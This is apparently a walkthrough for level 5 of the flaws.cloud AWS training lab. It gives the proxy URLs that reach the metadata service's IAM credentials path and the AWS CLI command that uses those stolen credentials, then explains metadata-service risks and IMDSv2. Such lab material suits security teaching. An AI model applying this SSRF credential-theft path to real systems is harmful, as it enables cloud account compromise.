# level 5
level 5 has a simple HTTP proxy on it (only HTTP, not HTTPS)

Using the proxy, you can exploit the metadata service at 169.254.169.254 (same for all cloud services). You should have been able to find your way from
`http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/`
to
`http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`

which lists the security credentials for level 6. You can add a profile to your AWS CLI and use that to list the contents of level 6

`aws --profile level5 s3 ls level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud`

Note that you need to specify the aws_session_token in your ~/.aws/credentials file or you will get an InvalidAccessKeyId error

## Lesson learned
The IP address 169.254.169.254 is a magic IP in the cloud world. AWS, Azure, Google, DigitalOcean and others use this to allow cloud resources to find out metadata about themselves. Some, such as Google, have additional constraints on the requests, such as requiring it to use `Metadata-Flavor: Google` as an HTTP header and refusing requests with an `X-Forwarded-For` header. AWS has recently created a new IMDSv2 that requires special headers, a challenge and response, and other protections, but many AWS accounts may not have enforced it. If you can make any sort of HTTP request from an EC2 to that IP, you'll likely get back information the owner would prefer you not see. 